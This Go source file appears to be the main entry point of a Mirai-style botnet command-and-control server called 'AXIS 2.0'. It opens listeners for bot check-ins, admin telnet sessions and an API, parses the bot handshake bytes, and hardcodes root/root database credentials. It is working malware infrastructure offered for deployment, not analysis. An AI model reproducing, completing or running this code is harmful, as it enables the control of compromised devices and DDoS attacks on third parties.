package main

import (
	"errors"
	"fmt"
	"net"
	"time"
)

// ============================================================================
// CONFIGURATION - Change these values to match your infrastructure
// ============================================================================
const DatabaseAddr string = "127.0.0.1:3306"
const DatabaseUser string = "root"
const DatabasePass string = "root"
const DatabaseTable string = "AXIS2"

// C&C Server listen address (0.0.0.0 for all interfaces)
const CNCListenAddr string = "0.0.0.0:3778"

// API Server listen address (set to empty string to disable API)
const APIListenAddr string = "0.0.0.0:3779"

// ============================================================================

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
	// Start C&C server
	tel, err := net.Listen("tcp", CNCListenAddr)
	if err != nil {
		return
	}

	// Start API server if configured
	if APIListenAddr != "" {
		api, err := net.Listen("tcp", APIListenAddr)
		if err != nil {
			return
		}

		go func() {
			for {
				conn, err := api.Accept()
				if err != nil {
					break
				}
				go apiHandler(conn)
			}
		}()
	}

	fmt.Printf("AXIS 2.0 C&C Server listening on %s\n", CNCListenAddr)

	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		go initialHandler(conn)
	}
}

func initialHandler(conn net.Conn) {
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	buf := make([]byte, 32)
	l, err := conn.Read(buf)
	if err != nil || l <= 0 {
		return
	}

	// Bot connections start with 4 bytes where first 3 are 0x00
	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		if buf[3] > 0 {
			string_len := make([]byte, 1)
			l, err := conn.Read(string_len)
			if err != nil || l <= 0 {
				return
			}
			var source string
			if string_len[0] > 0 {
				source_buf := make([]byte, string_len[0])
				l, err := conn.Read(source_buf)
				if err != nil || l <= 0 {
					return
				}
				source = string(source_buf)
			}
			NewBot(conn, buf[3], source).Handle()
		} else {
			NewBot(conn, buf[3], "").Handle()
		}
	} else {
		// Admin telnet session
		NewAdmin(conn).Handle()
	}
}

func apiHandler(conn net.Conn) {
	defer conn.Close()
	NewApi(conn).Handle()
}

func readXBytes(conn net.Conn, buf []byte) error {
	tl := 0

	for tl < len(buf) {
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return err
		}
		if n <= 0 {
			return errors.New("Connection closed unexpectedly")
		}
		tl += n
	}

	return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}
